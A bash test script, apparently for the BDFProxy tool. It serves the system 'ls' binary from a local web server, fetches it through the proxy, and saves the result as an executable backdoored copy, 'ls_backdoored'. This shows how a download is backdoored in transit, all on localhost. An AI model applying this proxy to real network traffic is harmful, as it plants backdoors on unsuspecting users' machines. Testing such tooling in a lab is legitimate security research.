#!/usr/bin/env bash

# This script configures a simple local python webserver
# and downloads $(which ls) from it through BDF proxy.

# figure out python executable (especially relevant on arch linux)
if [ $(which python2.7) ]
then
  PYTHON=python2.7
elif [$(which python2) ]
then
  PYTHON=python2
else
  PYTHON=python
fi

# start up the server
echo "[*] Starting up a webserver to serve /tmp"
cd /tmp
$PYTHON -m SimpleHTTPServer 9001 &
SERVER_PID=$!
cd -

echo "[*] Making a backup copy of config"
cp bdfproxy.cfg bdfproxy.cfg.backup

echo "[*] Patching config to turn off transparentProxy"
sed -i 's/^transparentProxy.\+/transparentProxy = False/' bdfproxy.cfg

# start the proxy
echo "[*] Starting"
$PYTHON ./bdf_proxy.py &
sleep 5
PROXY_PID=$!

echo "[*] Copying "$(which ls)" to /tmp"
cp $(which ls) /tmp

echo "[*] Attempting to download a backdoored version of "$(which ls)" to $(pwd)/ls_backdoored"
curl 'http://localhost:9001/ls' --proxy1.0 localhost:8080 > ls_backdoored

echo "[*] Shutting down"
kill $SERVER_PID
kill $PROXY_PID

echo "[*] Copying old config back"
cp bdfproxy.cfg.backup bdfproxy.cfg

echo "[*] Cleaning up temporary files"
rm -f /tmp/ls
rm bdfproxy.cfg.backup

echo "[*] ls_backdoored is available for testing in" $(pwd)
chmod +x ls_backdoored
